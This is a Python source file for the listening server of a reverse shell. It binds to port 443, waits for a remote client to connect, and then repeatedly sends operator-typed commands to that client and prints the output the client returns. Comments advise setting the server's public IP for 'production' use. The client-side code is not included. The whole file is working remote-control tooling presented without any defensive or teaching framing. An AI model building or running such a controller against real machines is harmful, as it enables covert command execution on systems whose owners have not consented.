import socket

""" Constants

By default, the SERVER_HOST variable is configured for running both the
client and the server on the same machine for testing purposes. For
production, ensure the SERVER_HOST and SERVER_PORT are correctly
configured to reflect ther server's public IP address as well as
an open port.

If so desired, these constants could be moved to a dotenv configuration
file for enhanced security when sharing.
"""
SERVER_HOST = '0.0.0.0'
SERVER_PORT = 443
BUFFER_SIZE = 1024 * 128 # Max message size
SEPARATOR = '<sep>' # Separator string for sending two messages at once
s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
print(f'Listening as {SERVER_HOST}:{SERVER_PORT}...')

""" Accept any incoming client connection; this allows for
multiple client connections.  If desired, this can be 
reconfigured to support only one specific client.
"""
client_socket, client_address = s.accept()
print(f'{client_address[0]}:{client_address[1]} Connected!')

""" Print working directory of client. """
cwd = client_socket.recv(BUFFER_SIZE).decode()
print('[+] Current working directory:', cwd)

""" Encode message from client and sent via client_socket (not SERVER_SOCKET). """
while True:
    command = input(f'{cwd} $> ')
    if not command.strip(): # empty command
        continue
    client_socket.send(command.encode()) # send the command to the client
    if command.lower() == 'exit':
        break
    output = client_socket.recv(BUFFER_SIZE).decode()
    results, cwd = output.split(SEPARATOR)
    print(results)

client_socket.close()
s.close()
